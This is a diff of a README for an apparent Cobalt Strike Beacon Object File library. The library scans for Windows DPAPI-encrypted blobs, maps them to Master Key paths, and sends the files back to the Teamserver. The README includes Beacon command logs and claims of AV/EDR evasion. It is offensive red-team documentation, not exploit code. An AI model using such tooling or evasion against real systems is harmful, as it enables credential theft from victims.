@@ -1,5 +1,5 @@
 # DPAPI BOF
-A Beacon Object File (BOF) for Cobalt Strike designed to identify DPAPI blobs, calculate the corresponding Master Key paths, and exfiltrate data.
+A modular library of Beacon Object Files (BOFs) designed to parse DPAPI blobs and map data relationships. These tools identify blobs, locate corresponding Master Keys, and output structured CSV data suitable for graph analysis, detailing relationships between users, keys, and encrypted files.
 
 <img src="assets/sample-beacon-output.png" style="width: 800px;"></img>
 
@@ -10,6 +10,12 @@ A Beacon Object File (BOF) for Cobalt Strike designed to identify DPAPI blobs, c
 > [!NOTE]  
 > This tool is intended for authorized security auditing and post-exploitation research only.
 
+## BOF Library
+| BOF | Arguments | Description |
+|----|----|----|
+| dpapi_scan | /path:c:\example\path\* [/dump:true\|false] | DPAPI scanner |
+| dpapi_describe | /path:c:\example\path\* [/dump:true\|false] | DPAPI blob detailed output |
+
 ## Features
 - **Scanning**: Identifies files containing DPAPI magic bytes.
 - **Master Key Mapping**: Automatically generates the expected path for the required Master Key based on the user's SID.
@@ -19,7 +25,7 @@ A Beacon Object File (BOF) for Cobalt Strike designed to identify DPAPI blobs, c
 - **No 'Fork & Run'**: Executes within the Beacon process, avoiding suspicious child process creation.
 - **Zero Disk IO**: Operates entirely in memory.
 - **AV/EDR Bypass**: Minimalist design reduces the likelihood of signature-based detection and memory-scanning alerts.
-- **Small Payload**: Optimized size (typically < 6.1KB) minimizes the RWE memory allocation signature.
+- **Small Payload**: Size minimizes the RWE memory allocation signature (typically ~7KB without ).
 
 ## Installation
 1. Copy `dpapi-bof-scan.c`, `dpapi-bof-describe.c`, `utils.h`, and `beacon.h` to your build machine.
@@ -58,9 +64,9 @@ If we can use the PPID of a Chrome Browser, for example, it would be normal usag
 ### Command Line
 Scan of DPAPI blobs and output filename and Master Key GUID.
 ```
-[02/06 02:37:10] beacon> dpapi_scan c:\dev\training\dpapi\tmp\*
+[02/06 02:37:10] beacon> dpapi_scan /path:c:\dev\training\dpapi\tmp\*
 [02/06 02:37:10] [+] DEBUG: raw flag value is: 0
-[02/06 02:37:10] [*] Running DPAPI Scanner (Dump Raw: ) against: c:\dev\training\dpapi\tmp\*
+[02/06 02:37:10] [*] Running DPAPI Scan against: c:\dev\training\dpapi\tmp\*
 [02/06 02:37:11] [+] host called home, sent: 5869 bytes
 [02/06 02:37:11] [+] received output:
 [+] Found DPAPI blob: c:\dev\training\dpapi\tmp\encrypted.out
@@ -68,10 +74,10 @@ Scan of DPAPI blobs and output filename and Master Key GUID.
 [+] BOF Finished.
 ```
 
-Scan of DPAPI blobs and output raw bytes for any files found.
+Scan of DPAPI blobs and output hex bytes for any files found.
 ```
-[02/06 01:20:00] beacon> dpapi_scan c:\dev\training\dpapi\tmp\* true
-[02/06 01:20:00] [*] Running DPAPI Scanner (Dump Raw: true) against: c:\dev\training\dpapi\tmp\*
+[02/06 01:20:00] beacon> dpapi_scan /path:c:\dev\training\dpapi\tmp\* /dump:true
+[02/06 01:20:00] [*] Running DPAPI Scan against: c:\dev\training\dpapi\tmp\*
 [02/06 01:20:09] [+] host called home, sent: 5629 bytes
 [02/06 01:20:09] [+] received output:
 [+] Found DPAPI blob: c:\dev\training\dpapi\tmp\encrypted.out
@@ -109,8 +115,8 @@ Scan of DPAPI blobs and output raw bytes for any files found.
 
 Printing the details about a specific blob with ```dpapi_describe```
 ```
-[02/08 03:33:26] beacon> dpapi_describe c:\dev\training\dpapi\tmp\encrypted.out
-[02/08 03:33:26] [*] Running DPAPI Scanner (Dump Raw: ) against: c:\dev\training\dpapi\tmp\encrypted.out
+[02/08 03:33:26] beacon> dpapi_describe /path:c:\dev\training\dpapi\tmp\encrypted.out
+[02/08 03:33:26] [*] Running DPAPI Scan against: c:\dev\training\dpapi\tmp\encrypted.out
 [02/08 03:33:33] [+] host called home, sent: 7855 bytes
 [02/08 03:33:33] [+] received output:
 [*] Blob Structure for: c:\dev\training\dpapi\tmp\encrypted.out
@@ -131,7 +137,6 @@ dwSignLen:           32
 --------------------------------
 [+] BOF Finished.
 ```
-
 
 ## Technical Details
 The BOF uses Dynamic Function Resolution (DFR) to interact with Windows APIs, ensuring it remains small and memory-resident without touching the disk (besides the files it reads). It uses the BeaconDownloadFile API to securely sync files back to the Teamserver.
